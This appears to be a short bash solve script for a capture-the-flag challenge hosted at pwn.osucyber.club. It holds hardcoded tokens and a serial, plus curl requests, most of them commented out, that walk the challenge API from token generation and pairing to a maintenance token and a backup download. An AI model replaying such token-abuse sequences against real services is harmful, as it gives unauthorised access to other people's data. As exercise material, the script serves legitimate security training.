#!/usr/bin/env bash

token=gSNEaD868LJd1DldhZUglykfGwu_NbcLu9d1wmT5luLFTfHV2eVQYI8EupRMi71Cz6qydOc0kgXnGcDoPuUkkA
mtoken=Ck2RtOs2RE1JTBnrOzEyaoC4fl8XfsyeoWtARkoc9ZAXwDAvyIHqMBzpBQhnYJT3ybXlu1BrbIfvVWPIkLpEdw
serial=60AKGPCIAX1AYIVN36M7MSIOXCRQ17ET2U17VUSS
url=http://pwn.osucyber.club:13372

# curl -i -X POST -H 'Content-Type: application/json' -d "{\"token\": \"${token}\", \"time\": \"10\"}" $url/api/toast
# curl -i -X POST -H 'Content-Type: application/json' $url/api/generate_token
# curl -i -X POST -H 'Content-Type: application/json' -d "{\"token\": \"${token}\", \"time\": \"10\"}" $url/api/pair

# sleep 1

# curl -i -X POST -H 'Content-Type: application/json' $url/api/generate_token

curl "http://pwn.osucyber.club:13372/api/status?token=${token}"

# curl -i -X POST -H 'Content-Type: application/json' -d "{\"token\": \"${token}\", \"time\": \"10\"}" $url/api/cancel_toast
# curl -i -X POST -H 'Content-Type: application/json' -d "{\"token\": \"${token}\", \"serial\": \"${serial}\"}" $url/api/generate_maintenance_token
# curl -i -X GET -H 'Content-Type: application/json' -d "{\"token\": \"${mtoken}\"}" $url/api/download_backup

# curl 'http://pwn.osucyber.club:13372/api/status?token=gSNEaD868LJd1DldhZUglykfGwu_NbcLu9d1wmT5luLFTfHV2eVQYI8EupRMi71Cz6qydOc0kgXnGcDoPuUkkA' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache'

curl "http://pwn.osucyber.club:13372/api/download_backup?token=${mtoken}"
